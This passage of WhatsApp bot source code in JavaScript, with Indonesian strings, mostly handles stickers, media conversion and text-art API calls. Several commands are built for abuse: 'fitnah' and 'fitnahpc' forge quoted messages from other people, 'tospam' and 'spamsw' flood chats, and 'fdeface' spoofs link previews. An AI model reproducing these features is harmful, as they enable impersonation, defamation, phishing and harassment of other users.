          { displayName: `${nah}`, vcard: vcard },
          contact,
          { contextInfo: { mentionedJid: members_ids } }
        );
        break;
      case "sticktag":
        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
        if (
          ((isMedia && !mek.message.videoMessage) || isQuotedSticker) &&
          args.length == 0
        ) {
          encmedia = isQuotedSticker
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          file = await syaa.downloadAndSaveMediaMessage(
            encmedia,
            (filename = getRandom())
          );
          value = args.join(" ");
          var group = await syaa.groupMetadata(from);
          var member = group["participants"];
          var mem = [];
          member.map(async (adm) => {
            mem.push(adm.id.replace("c.us", "s.whatsapp.net"));
          });
          var options = {
            contextInfo: { mentionedJid: mem },
            quoted: mek,
          };
          ini_buffer = fs.readFileSync(file);
          syaa.sendMessage(from, ini_buffer, sticker, options);
          fs.unlinkSync(file);
        } else {
          reply(`*Reply sticker yang sudah dikirim*`);
        }
        break;
      case "totag":
        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
        if (!isGroupAdmins)return reply(mess.admin)
        if (
          ((isMedia && !mek.message.videoMessage) || isQuotedSticker) &&
          args.length == 0
        ) {
          encmedia = isQuotedSticker
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          file = await syaa.downloadAndSaveMediaMessage(
            encmedia,
            (filename = getRandom())
          );
          value = args.join(" ");
          var group = await syaa.groupMetadata(from);
          var member = group["participants"];
          var mem = [];
          member.map(async (adm) => {
            mem.push(adm.id.replace("c.us", "s.whatsapp.net"));
          });
          var options = {
            contextInfo: { mentionedJid: mem },
            quoted: mek,
          };
          ini_buffer = fs.readFileSync(file);
          syaa.sendMessage(from, ini_buffer, sticker, options);
          fs.unlinkSync(file);
        } else if (
          ((isMedia && !mek.message.videoMessage) || isQuotedImage) &&
          args.length == 0
        ) {
          encmedia = isQuotedImage
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          file = await syaa.downloadAndSaveMediaMessage(
            encmedia,
            (filename = getRandom())
          );
          value = args.join(" ");
          var group = await syaa.groupMetadata(from);
          var member = group["participants"];
          var mem = [];
          member.map(async (adm) => {
            mem.push(adm.id.replace("c.us", "s.whatsapp.net"));
          });
          var options = {
            contextInfo: { mentionedJid: mem },
            quoted: mek,
          };
          ini_buffer = fs.readFileSync(file);
          syaa.sendMessage(from, ini_buffer, image, options);
          fs.unlinkSync(file);
        } else if (
          ((isMedia && !mek.message.videoMessage) || isQuotedAudio) &&
          args.length == 0
        ) {
          encmedia = isQuotedAudio
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          file = await syaa.downloadAndSaveMediaMessage(
            encmedia,
            (filename = getRandom())
          );
          value = args.join(" ");
          var group = await syaa.groupMetadata(from);
          var member = group["participants"];
          var mem = [];
          member.map(async (adm) => {
            mem.push(adm.id.replace("c.us", "s.whatsapp.net"));
          });
          var options = {
            mimetype: "audio/mp4",
            ptt: true,
            contextInfo: { mentionedJid: mem },
            quoted: mek,
          };
          ini_buffer = fs.readFileSync(file);
          syaa.sendMessage(from, ini_buffer, audio, options);
          fs.unlinkSync(file);
        } else if (
          ((isMedia && !mek.message.videoMessage) || isQuotedVideo) &&
          args.length == 0
        ) {
          encmedia = isQuotedVideo
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          file = await syaa.downloadAndSaveMediaMessage(
            encmedia,
            (filename = getRandom())
          );
          value = args.join(" ");
          var group = await syaa.groupMetadata(from);
          var member = group["participants"];
          var mem = [];
          member.map(async (adm) => {
            mem.push(adm.id.replace("c.us", "s.whatsapp.net"));
          });
          var options = {
            mimetype: "video/mp4",
            contextInfo: { mentionedJid: mem },
            quoted: mek,
          };
          ini_buffer = fs.readFileSync(file);
          syaa.sendMessage(from, ini_buffer, video, options);
          fs.unlinkSync(file);
        } else {
          reply(
            `reply gambar/sticker/audio/video dengan caption ${prefix}totag`
          );
        }
        break;
      case "fitnah":
        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
        if (args.length < 1)
          return reply(
            `Usage :\n${prefix}fitnah [@tag|pesan|balasanbot]]\n\nEx : \n${prefix}fitnah @tagmember|hai|hai juga`
          );
        var gh = args.join(" ");
        mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid;
        var replace = gh.split("|")[0];
        var target = gh.split("|")[1];
        var bot = gh.split("|")[2];
        syaa.sendMessage(from, `${bot}`, text, {
          quoted: {
            key: {
              fromMe: false,
              participant: `${mentioned}`,
              ...(from ? { remoteJid: from } : {}),
            },
            message: { conversation: `${target}` },
          },
        });
        break;
      case "settarget":
        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
        if (!isOwner && !mek.key.fromMe) return sticOwner(from)
        if (!q) return reply(`${prefix}settarget 628xxxxx`);
        targetpc = args[0];
        fakegroup(`Succes Mengganti target fitnahpc : ${targetpc}`);
        break;
      case "fitnahpc":
        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
        if (!q) return reply(`${prefix}fitnahpc teks target|teks lu`);
        jids = `${targetpc}@s.whatsapp.net`; // nomer target
        var split = args.join(" ").replace(/@|\d/gi, "").split("|");
        var taged = mek.message.extendedTextMessage.contextInfo.mentionedJid[0];
        var options = {
          contextInfo: {
            quotedMessage: { extendedTextMessage: { text: split[0] } },
          },
        };
        const responye = await syaa.sendMessage(
          jids,
          `${split[1]}`,
          MessageType.text,
          options
        );
        await syaa.deleteMessage(jids, {
          id: responye.messageID,
          remoteJid: jids,
          fromMe: true,
        });
        break;
      case "tomp3":
        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
        if (!isQuotedVideo) return fakegroup("Reply videonya!");
        fakegroup(mess.wait);
        encmedia = JSON.parse(JSON.stringify(mek).replace("quotedM", "m"))
          .message.extendedTextMessage.contextInfo;
        media = await syaa.downloadAndSaveMediaMessage(encmedia);
        ran = getRandom(".mp4");
        exec(`ffmpeg -i ${media} ${ran}`, (err) => {
          fs.unlinkSync(media);
          if (err) return fakegroup(`Err: ${err}`);
          buffer453 = fs.readFileSync(ran);
          syaa.sendMessage(from, buffer453, audio, {
            mimetype: "audio/mp4",
            quoted: mek,
          });
          fs.unlinkSync(ran);
        });
        break;
      case "fast":
        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
        if (!isQuotedVideo) return fakegroup("Reply videonya!");
        fakegroup(mess.wait);
        encmedia = JSON.parse(JSON.stringify(mek).replace("quotedM", "m"))
          .message.extendedTextMessage.contextInfo;
        media = await syaa.downloadAndSaveMediaMessage(encmedia);
        ran = getRandom(".mp4");
        exec(
          `ffmpeg -i ${media} -filter_complex "[0:v]setpts=0.5*PTS[v];[0:a]atempo=2[a]" -map "[v]" -map "[a]" ${ran}`,
          (err) => {
            fs.unlinkSync(media);
            if (err) return fakegroup(`Err: ${err}`);
            buffer453 = fs.readFileSync(ran);
            syaa.sendMessage(from, buffer453, video, {
              mimetype: "video/mp4",
              quoted: mek,
            });
            fs.unlinkSync(ran);
          }
        );
        break;
      case "slow":
        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
        if (!isQuotedVideo) return fakegroup("Reply videonya!");
        fakegroup(mess.wait);
        encmedia = JSON.parse(JSON.stringify(mek).replace("quotedM", "m"))
          .message.extendedTextMessage.contextInfo;
        media = await syaa.downloadAndSaveMediaMessage(encmedia);
        ran = getRandom(".mp4");
        exec(
          `ffmpeg -i ${media} -filter_complex "[0:v]setpts=2*PTS[v];[0:a]atempo=0.5[a]" -map "[v]" -map "[a]" ${ran}`,
          (err) => {
            fs.unlinkSync(media);
            if (err) return fakegroup(`Err: ${err}`);
            buffer453 = fs.readFileSync(ran);
            syaa.sendMessage(from, buffer453, video, {
              mimetype: "video/mp4",
              quoted: mek,
            });
            fs.unlinkSync(ran);
          }
        );
        break;
      case "reverse":
        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
        if (!isQuotedVideo) return fakegroup("Reply videonya!");
        encmedia = JSON.parse(JSON.stringify(mek).replace("quotedM", "m"))
          .message.extendedTextMessage.contextInfo;
        media = await syaa.downloadAndSaveMediaMessage(encmedia);
        ran = getRandom(".mp4");
        exec(`ffmpeg -i ${media} -vf reverse -af areverse ${ran}`, (err) => {
          fs.unlinkSync(media);
          if (err) return fakegroup(`Err: ${err}`);
          buffer453 = fs.readFileSync(ran);
          syaa.sendMessage(from, buffer453, video, {
            mimetype: "video/mp4",
            quoted: mek,
          });
          fs.unlinkSync(ran);
        });
        break;

      case "anime":
        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
        reply(mess.wait);
        fetch(
          "https://raw.githubusercontent.com/pajaar/grabbed-results/master/pajaar-2020-gambar-anime.txt"
        )
          .then((res) => res.text())
          .then((body) => {
            let tod = body.split("\n");
            let pjr = tod[Math.floor(Math.random() * tod.length)];
            imageToBase64(pjr)
              .then((response) => {
                media = Buffer.from(response, "base64");
                syaa.sendMessage(from, media, image, {
                  quoted: mek,
                  caption: "NIH",
                });
              })
              .catch((error) => {
                console.log(error);
              });
          });
        break;
      case "kontak":
        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
        pe = args.join(" ");
        entah = pe.split("|")[0];
        nah = pe.split("|")[1];
        if (isNaN(entah)) return reply("Invalid phone number");
        vcard =
          "BEGIN:VCARD\n" +
          "VERSION:3.0\n" +
          `FN:${nah}\n` +
          `TEL;type=CELL;type=VOICE;waid=${entah}:${phoneNum(
            "+" + entah
          ).getNumber("internasional")}\n` +
          "END:VCARD".trim();
        syaa.sendMessage(
          from,
          { displayName: `${nah}`, vcard: vcard },
          contact
        );
        break;
      case "take":
      case "colong":
        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
        if (!isQuotedSticker) return reply("Stiker aja om");
        encmedia = JSON.parse(JSON.stringify(mek).replace("quotedM", "m"))
          .message.extendedTextMessage.contextInfo;
        media = await syaa.downloadAndSaveMediaMessage(encmedia);
        anu = args.join(" ").split("|");
        satu = anu[0] !== "" ? anu[0] : `Arasyaaa`;
        dua = typeof anu[1] !== "undefined" ? anu[1] : `@sofunsyabi.id`;
        require("./lib/fetcher.js").createExif(satu, dua);
        require("./lib/fetcher.js").modStick(media, syaa, mek, from);
        break;
        
        
      case "stikerwm":
      case "stickerwm":
      case "swm":
        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
        pe = args.join("");
        var a = pe.split("|")[0];
        var b = pe.split("|")[1];
        if ((isMedia && !mek.message.videoMessage) || isQuotedImage) {
          const encmedia = isQuotedImage
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          media = await syaa.downloadAndSaveMediaMessage(encmedia);
          await createExif(a, b);
          out = getRandom(".webp");
          ffmpeg(media)
            .on("error", (e) => {
              console.log(e);
              syaa.sendMessage(from, "Terjadi kesalahan", "conversation", {
                quoted: mek,
              });
              fs.unlinkSync(media);
            })
            .on("end", () => {
              _out = getRandom(".webp");
              spawn("webpmux", [
                "-set",
                "exif",
                "./stik/data.exif",
                out,
                "-o",
                _out,
              ]).on("exit", () => {
                syaa.sendMessage(
                  from,
                  fs.readFileSync(_out),
                  "stickerMessage",
                  { quoted: mek }
                );
                fs.unlinkSync(out);
                fs.unlinkSync(_out);
                fs.unlinkSync(media);
              });
            })
            .addOutputOptions([
              `-vcodec`,
              `libwebp`,
              `-vf`,
              `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`,
            ])
            .toFormat("webp")
            .save(out);
        } else if (
          ((isMedia && mek.message.videoMessage.seconds < 11) ||
            (isQuotedVideo &&
              mek.message.extendedTextMessage.contextInfo.quotedMessage
                .videoMessage.seconds < 11)) &&
          args.length == 0
        ) {
          const encmedia = isQuotedVideo
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          const media = await syaa.downloadAndSaveMediaMessage(encmedia);
          pe = args.join("");
          var a = pe.split("|")[0];
          var b = pe.split("|")[1];
          await createExif(a, b);
          out = getRandom(".webp");
          ffmpeg(media)
            .on("error", (e) => {
              console.log(e);
              syaa.sendMessage(from, "Terjadi kesalahan", "conversation", {
                quoted: mek,
              });
              fs.unlinkSync(media);
            })
            .on("end", () => {
              _out = getRandom(".webp");
              spawn("webpmux", [
                "-set",
                "exif",
                "./stik/data.exif",
                out,
                "-o",
                _out,
              ]).on("exit", () => {
                syaa.sendMessage(
                  from,
                  fs.readFileSync(_out),
                  "stickerMessage",
                  { quoted: mek }
                );
                fs.unlinkSync(out);
                fs.unlinkSync(_out);
                fs.unlinkSync(media);
              });
            })
            .addOutputOptions([
              `-vcodec`,
              `libwebp`,
              `-vf`,
              `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`,
            ])
            .toFormat("webp")
            .save(out);
        } else {
          reply(
            `Kirim gambar dengan caption ${prefix}swm teks|teks atau tag gambar yang sudah dikirim`
          );
        }
        break;
        case "spamsw":
          if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
if (!arg) return reply(`Penggunaan ${prefix}spamsw teks|jumlah`)
				argzi = arg.split("|")
				if (!argzi) return reply(`Penggunaan ${prefix}spam teks|jumlah`)
				if (Number(argzi[1]) >= 50) return reply('Kebanyakan!')
				if (isNaN(argzi[1])) return reply(`harus berupa angka`)
				for (let i = 0; i < argzi[1]; i++){
					syaa.sendMessage('status@broadcast', argzi[0], MessageType.text)
                    }
                    break	
      case "upswteks":
        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
        if (!isOwner && !mek.key.fromMe) return sticOwner(from)    
        if (!q) return reply("Isi teksnya!");
        syaa.sendMessage("status@broadcast", `${q}`, extendedText);
        fakegroup(`Sukses Up story wea teks ${q}`);
        break;
        case "upswlokasi":
          if (!isOwner && !mek.key.fromMe) return sticOwner(from)    
  if (args.length < 1) return reply('Teksnya?')
                    teks = body.slice(12)
                    syaa.sendMessage('status@broadcast', {degreesLatitude: 24.121231, degreesLongitude: 55.1121221, name:teks,address:`${NamaBot}`}, MessageType.location)
                    reply(`Sukses upload lokasi:\n${teks}`)
                    break	
                    case "tospam":
                      if (isBanned) return reply(mess.ban)
if (!isQuotedSticker && !isQuotedAudio && !isQuotedImage && budy.length > 10) {
teks = body.slice(8)
oi1 = teks.split('|')[0]
oi2 = teks.split('|')[1]
if (Number(oi2) >= 50) return reply('Kebanyakan!')
if (!Number(oi2)) return reply('Jumlah harus berupa angka!')
	  for (let i = 0; i < oi2; i++) {
	  syaa.sendMessage(from, `${oi1}`, MessageType.text)
	  }
} else if (!isQuotedSticker && !isQuotedAudio && !isQuotedImage && budy.length < 10) {
teks = mek.message.extendedTextMessage.contextInfo.quotedMessage.conversation
if (!Number(args[0])) return reply('Jumlah harus berupa angka!')
if (Number(args[0]) >= 50) return reply('Kebanyakan!')
	  for (let i = 0; i < args[0]; i++) {
	  syaa.sendMessage(from, teks, MessageType.text)
	  }
} else if (isQuotedSticker) {
	encmedian = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	         median = await syaa.downloadAndSaveMediaMessage(encmedian)
				anu = fs.readFileSync(median)
	if (!Number(args[0])) return reply('Jumlah harus berupa angka!')
	if (Number(args[0]) >= 50) return reply('Kebanyakan!')
	  for (let i = 0; i < args[0]; i++) {
	  syaa.sendMessage(from, anu, sticker)
	  }
} else if (isQuotedAudio) {
	encmediat = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	            mediat = await syaa.downloadAndSaveMediaMessage(encmediat)
				anu = fs.readFileSync(mediat)
	if (!Number(args[0])) return reply('Jumlah harus berupa angka!')
	if (Number(args[0]) >= 50) return reply('Kebanyakan!')
	  for (let i = 0; i < args[0]; i++) {
	  syaa.sendMessage(from, anu, audio, {mimetype: 'audio/mp4', duration: 359996400, ptt:true})
	  }
} else if (isQuotedImage) {
	boij = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
	delb = await syaa.downloadMediaMessage(boij)
	teks = body.slice(6)
	oi1 = teks.split('|')[0]
oi2 = teks.split('|')[1]
if (Number(oi2) >= 50) return reply('Kebanyakan!')
	if (!Number(oi2)) return reply('Jumlah harus berupa angka!')
	  for (let i = 0; i < oi2; i++) {
	  syaa.sendMessage(from, delb, MessageType.image, {caption: oi1})
	  }
}
	  break
   case "vampire":
     if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
   if (args.length < 1) return reply(from, `Penggunaan ${prefix}vampire teks`, mek)
   if (isBanned) return reply(mess.ban)
   bapakao = body.slice(9)
   sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/vampire?text=${bapakao}&apikey=Ikyy69`)
   break
case "remm":
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
  
   if (args.length < 1) return reply(from, `Penggunaan ${prefix + command} teks`, mek)
   if (isBanned) return reply(mess.ban)
   reply(mess.wait)
   bapakao = body.slice(6)
   sendMediaURL(from, `https://hardianto-chan.herokuapp.com/api/bot/gfx5?apikey=hardianto&text=${bapakao}`)
   break
case "logogaming":
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
   if (args.length < 1) return reply(from, `Penggunaan ${prefix + command} teks`, mek)
   if (isBanned) return reply(mess.ban)
   reply(mess.wait)
   bapakao = body.slice(12)
   sendMediaURL(from, `https://docs-jojo.herokuapp.com/api/gaming?text=${bapakao}`)
   break
case "text2d":
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
   if (args.length < 1) return reply(from, `Penggunaan ${prefix + command} teks`, mek)
   if (isBanned) return reply(mess.ban)
   reply(mess.wait)
   bapakao = body.slice(12)
   sendMediaURL(from, `https://docs-jojo.herokuapp.com/api/text3d?text=${bapakao}`)
   break
case "lolim":
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
  
   if (args.length < 1) return reply(from, `Penggunaan ${prefix + command}teks`, mek)
   if (isBanned) return reply(mess.ban)
   reply(mess.wait)
   bapakao = body.slice(7)
   sendMediaURL(from, `https://hardianto-chan.herokuapp.com/api/bot/gfx2?apikey=hardianto&nama=${bapakao}`)
   break
case "kaneki":
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
  if (isBanned) return reply(mess.ban)
   if (args.length < 1) return reply(from, `Penggunaan ${prefix + command}teks`, mek)
   reply(mess.wait)
   bapakao = body.slice(8)
   sendMediaURL(from, `https://hardianto-chan.herokuapp.com/api/bot/gfx1?apikey=hardianto&nama=${bapakao}`)
   break
case "gura":
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
  
   if (args.length < 1) return reply(from, `Penggunaan ${prefix + command}teks`, mek)
   if (isBanned) return reply(mess.ban)
   reply(mess.wait)
   bapakao = body.slice(6)
   sendMediaURL(from, `https://hardianto-chan.herokuapp.com/api/bot/gura?apikey=hardianto&nama=${bapakao}`)
   break
case "neko":
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
   if (isBanned) return reply(mess.ban)
   bapakao = body.slice(9)
   sendMediaURL(from, `https://hardianto-chan.herokuapp.com/api/anime/random?sfw=neko&apikey=hardianto`)
   break
case "bajingan":
     if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
   if (args.length < 1) return reply(from, `Penggunaan ${prefix}bajingan lu teks`, mek)
   if (isBanned) return reply(mess.ban)
   bapakao = body.slice(10)
   sendStickerFromUrl(from, `https://hardianto-chan.herokuapp.com/api/creator/memegen?bawah=${bapakao}&atas=bajingan&imgurl=https://telegra.ph/file/d608ec3cb57ff6b9ac708.jpg&apikey=hardianto`)
   reply("Succes Buat Fitur Bajingan, Jangan lupa subscribe channel owner : https://youtu.be/OpVvYMn14ik")
   break
case "darkjokes":
  case "darkjoke":
    if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
   if (isBanned) return reply(mess.ban)
   bapakao = body.slice(9)
   sendMediaURL(from, `https://hardianto-chan.herokuapp.com/api/darkmeme?apikey=hardianto`)
   break
   case "codetxt":
     if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
   if (args.length < 1) return reply(from, `Penggunaan ${prefix}codetxt teks`, mek)
   if (isBanned) return reply(mess.ban)
   bapakao = body.slice(9)
   sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/maker/carbon?code=$${bapakao}&apikey=Ikyy69`)
   break
case "matrix":
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
				if (args.length < 1) return reply(from, `Penggunaan ${prefix}matrix teks`, mek)
				if (isBanned) return reply(mess.ban)
				bapakao = body.slice(8)
				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/matrix?text=${bapakao}&apikey=Ikyy69`)
				break
				case "spiderman":
				  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
				if (args.length < 1) return reply(from, `Penggunaan ${prefix}spiderman teks`, mek)
				if (isBanned) return reply(mess.ban)
				bapakao = body.slice(11)
				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/spider?text=${bapakao}&apikey=Ikyy69`)
				break
				case "express":
				  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
				if (args.length < 1) return reply(from, `Penggunaan ${prefix}express teks`, mek)
				if (isBanned) return reply(mess.ban)
				bapakao = body.slice(9)
				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/express?text=${bapakao}&apikey=Ikyy69`)
				break
				case "dance":
				  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
				if (args.length < 1) return reply(from, `Penggunaan ${prefix}dance teks`, mek)
				if (isBanned) return reply(mess.ban)
				bapakao = body.slice(7)
				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/dance?text=${bapakao}&apikey=Ikyy69`)
				break
				case "text3d":
				  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
				if (args.length < 1) return reply(from, `Penggunaan ${prefix}text3d teks`, mek)
				if (isBanned) return reply(mess.ban)
				bapakao = args.join(" ")
				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/text3d?text=${bapakao}&apikey=Ikyy69`)
				break
				case "warrior":
				  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
				if (args.length < 1) return reply(from, `Penggunaan ${prefix}warrior teks`, mek)
				if (isBanned) return reply(mess.ban)
				bapakao = args.join(" ")
				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/warrior?text=${bapakao}&apikey=Ikyy69`)
				break
				case 'd':
				case 'del':
				case 'delete':
					syaa.deleteMessage(from, { id: mek.message.extendedTextMessage.contextInfo.stanzaId, remoteJid: from, fromMe: true })
					break
                    case "upswsticker":
                    if (!isOwner && !mek.key.fromMe) return sticOwner(from)    
if (!isQuotedSticker) return reply('Reply stikernya!')
if (isMedia && !mek.message.videoMessage || isQuotedSticker) {
						const encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await syaa.downloadMediaMessage(encmedia)
						syaa.sendMessage('status@broadcast', buff, sticker)
						}
						reply(`Sukses upload sticker`)
                    break
                     case "upswaudio":
                    
if (!isQuotedAudio) return reply('Reply audionya!')
if (isMedia && !mek.message.videoMessage || isQuotedAudio) {
						const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await syaa.downloadMediaMessage(encmedia)
						syaa.sendMessage('status@broadcast', buff, audio, {mimetype: 'audio/mp4', duration: 359996400})
						}
						reply(`Sukses upload audio`)
						break
						case "upswvoice":
                    
if (!isQuotedAudio) return reply('Reply audionya!')
if (isMedia && !mek.message.videoMessage || isQuotedAudio) {
						const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await syaa.downloadMediaMessage(encmedia)
						syaa.sendMessage('status@broadcast', buff, audio, {mimetype: 'audio/mp4', duration: 359996400, ptt: true})
						}
						reply(`Sukses upload voice`)
						break
      case "upswimage":
        if (isQuotedImage) {
          const swsw = isQuotedImage
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          cihcih = await syaa.downloadMediaMessage(swsw);
          syaa.sendMessage("status@broadcast", cihcih, image, {
            caption: `${q}`,
          });
          bur = `Sukses Upload Story Image dengan Caption: ${q}`;
          syaa.sendMessage(from, bur, text, { quoted: mek });
        } else {
          reply("Reply gambarnya!");
        }
        break;
      case "upswvideo":
        if (isQuotedVideo) {
          const swsw = isQuotedVideo
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          cihcih = await syaa.downloadMediaMessage(swsw);
          syaa.sendMessage("status@broadcast", cihcih, video, {
            caption: `${q}`,
          });
          bur = `Sukses Upload Story Video dengan Caption: ${q}`;
          syaa.sendMessage(from, bur, text, { quoted: mek });
        } else {
          reply("reply videonya!");
        }
        break;
      case "fdeface":
        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
        if (isBanned) return reply(mess.ban)
        ge = args.join(" ");
        var pe = ge.split("|")[0];
        var pen = ge.split("|")[1];
        var pn = ge.split("|")[2];
        var be = ge.split("|")[3];
        const fde = `kirim/reply image dengan capion ${prefix}fdeface link|title|desc|teks`;
        if (args.length < 1) return reply(fde);
        const dipes =
          isQuotedSticker || isQuotedImage
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
        const tipes = await syaa.downloadAndSaveMediaMessage(dipes);
        const bufer = fs.readFileSync(tipes);
        const desc = `${pn}`;
        const title = `${pen}`;
        const url = `${pe}`;
        const buu = `https://${be}`;
        var anu = {
          detectLinks: false,
        };
        var mat = await syaa.generateLinkPreview(url);
        mat.title = title;
        mat.description = desc;
        mat.jpegThumbnail = bufer;
        mat.canonicalUrl = buu;
        syaa.sendMessage(from, mat, MessageType.extendedText, anu);
        break;
      case "public":
        if (!isOwner && !mek.key.fromMe) return sticOwner(from)
        if (banChats === false) return;
        // var taged = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
        banChats = false;
        reply(`「 *PUBLIC-MODE* 」`);
        break;
      case "self":
        if (!isOwner && !mek.key.fromMe) return sticOwner(from)
        if (banChats === true) return;
        uptime = process.uptime();
        // var taged = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
        banChats = true;
        reply(`「 *SELF-MODE* 」`);
        break;
      case "hidetag":
        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
        if (!isGroupAdmins && !mek.key.fromMe) return reply("KHUSUS ADMIN!!");
        if (!isGroup) return reply(mess.only.group);
        var value = args.join(" ");
        var group = await syaa.groupMetadata(from);
        var member = group["participants"];
        var mem = [];
        member.map(async (adm) => {
          mem.push(adm.id.replace("c.us", "s.whatsapp.net"));
        });
        var optionshidetag = {
          text: value,
          contextInfo: { mentionedJid: mem },
          quoted: mek,
        };
        syaa.sendMessage(from, optionshidetag, text);
        break;
        case 'video':
          if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
            if (args.length === 0) return reply(`Kirim perintah *${prefix}video* _Judul lagu yang akan dicari_`)
            var srch = args.join('')
            aramas = await yts(srch);
            aramat = aramas.all 
            var mulaikah = aramat[0].url                            
                  try {
                    ytv(mulaikah)
                    .then((res) => {
                        const { dl_link, thumb, title, filesizeF, filesize } = res
                        axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
                        .then(async (a) => {
                        if (Number(filesize) >= 100000) return sendMediaURL(from, thumb, `*PLAY VIDEO*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Untuk durasi lebih dari batas disajikan dalam mektuk link_`)
                        const captions = `*PLAY VIDEO*\n\n*Title* : ${title}\n*Ext* : MP4\n*Size* : ${filesizeF}\n*Link* : ${a.data}\n\n_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`
                        sendMediaURL(from, thumb, captions)
                        await sendMediaURL(from, dl_link).catch(() => reply('error'))
                        })                
                        })
                        } catch (err) {
                        reply(mess.error.api)
                        }
                   break
        case 'playyy':
          if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
			if (args.length === 0) return reply(`Kirim perintah *${prefix}play* _Judul lagu yang akan dicari_`)
